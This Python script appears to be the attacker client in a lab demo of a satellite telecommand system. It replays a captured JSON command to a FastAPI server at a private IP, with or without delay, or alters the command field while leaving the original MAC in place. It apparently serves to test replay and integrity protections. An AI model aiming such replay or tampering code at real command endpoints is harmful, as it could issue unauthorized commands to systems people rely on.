import json
import time
import urllib.request
import urllib.error


# ==============================
# FastAPI server configuration
# ==============================

SERVER_IP = '10.88.41.92'   # Laptop 2 IP
SERVER_PORT = 8000

URL = f'http://{SERVER_IP}:{SERVER_PORT}/telecommand'


# ==============================
# Captured legitimate message
# ==============================

CAPTURED_MESSAGE_FILE = 'captured_message.json'


def load_captured_message():
    with open(CAPTURED_MESSAGE_FILE, 'r') as file:
        return json.load(file)


# ==============================
# Send HTTP telecommand
# ==============================

def send_message(message):

    data = json.dumps(message).encode()

    request = urllib.request.Request(
        URL,
        data=data,
        headers={
            'Content-Type': 'application/json'
        },
        method='POST'
    )

    try:
        with urllib.request.urlopen(
            request,
            timeout=5
        ) as response:

            result = response.read().decode()

            print(
                f'[ATTACKER] Server response: {result}'
            )

    except urllib.error.HTTPError as e:

        error_body = e.read().decode()

        print(
            f'[ATTACKER] Server rejected message '
            f'({e.code}): {error_body}'
        )

    except Exception as e:

        print(
            f'[ATTACKER] Connection failed: {e}'
        )


# ==============================
# Replay attack
# ==============================

def replay_attack(delay):

    print(
        f'[ATTACKER] Waiting {delay} seconds before replay...'
    )

    time.sleep(delay)

    message = load_captured_message()

    print(
        '[ATTACKER] Replaying captured telecommand'
    )

    print(
        json.dumps(message, indent=2)
    )

    send_message(message)


# ==============================
# Tampering attack
# ==============================

def tampering_attack():

    message = load_captured_message()

    original_command = message['command']

    message['command'] = 'UNAUTHORIZED_COMMAND'

    print(
        '[ATTACKER] Tampering with captured telecommand'
    )

    print(
        f'[ATTACKER] Command changed: '
        f'{original_command} -> {message["command"]}'
    )

    print(
        '[ATTACKER] Original MAC is intentionally kept unchanged'
    )

    send_message(message)


# ==============================
# Main
# ==============================

if __name__ == '__main__':

    print('======================================')
    print('   SATELLITE NETWORK ATTACKER')
    print('======================================')
    print()
    print('1. Immediate replay')
    print('2. Delayed replay')
    print('3. Tampering')
    print()

    choice = input('Select attack: ')

    if choice == '1':

        replay_attack(0)

    elif choice == '2':

        replay_attack(15)

    elif choice == '3':

        tampering_attack()

    else:

        print('[ATTACKER] Invalid selection')
